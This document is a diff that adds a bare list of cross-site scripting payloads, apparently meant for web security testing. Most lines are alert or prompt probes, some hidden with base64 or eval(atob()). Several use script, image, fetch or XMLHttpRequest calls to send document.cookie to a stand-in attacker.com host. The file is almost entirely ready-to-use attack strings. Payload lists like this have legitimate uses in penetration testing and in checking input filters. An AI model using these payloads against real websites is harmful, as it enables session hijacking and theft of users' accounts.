@@ -1,0 +1,29 @@
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>prompt(5000/200)</script>
+<ScRipT>alert(document.cookie)</ScRipT>
+<script>prompt(document.cookie)</script>
+<script>console.log(5000/3000)</script>
+<img src="x" onerror="alert('XSS')"/>
+<svg/onload=alert('XSS')>
+"><script>alert('XSS')</script>
+<body onload=alert('XSS')>
+<img src=x onerror=prompt('XSS')>
+<img src="javascript:alert('XSS')">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+'><script>alert("XSS")</script>
+<img src=x onerror="eval(atob('YWxlcnQoIlhTUyIpOw=='))">
+<iframe src="javascript:alert('XSS')"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+"><img src=x onerror=confirm('XSS')>
+<script>document.location='https://attacker.com/xss.php?c='+document.cookie</script>
+<script>document.write("<img src='https://attacker.com/xss.php?c=" + document.cookie + "'>")</script>
+<script>new Image().src='https://attacker.com/xss.php?c='+document.cookie</script>
+<script>var i=new Image();i.src='https://attacker.com/xss.php?c='+document.cookie;document.body.appendChild(i)</script>
+<script>fetch('https://attacker.com/xss.php?c='+document.cookie,{mode:'no-cors'})</script>
+<script>var xhr=new XMLHttpRequest();xhr.open("GET","https://attacker.com/xss.php?c="+document.cookie,true);xhr.send();</script>
+<script>var img=new Image();img.src='https://attacker.com/xss.php?c='+encodeURIComponent(document.cookie);document.body.appendChild(img);</script>
+<img src=x onerror="(function(){document.location='https://attacker.com/xss.php?c='+document.cookie})()">
+<script>document.location='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+'</script>
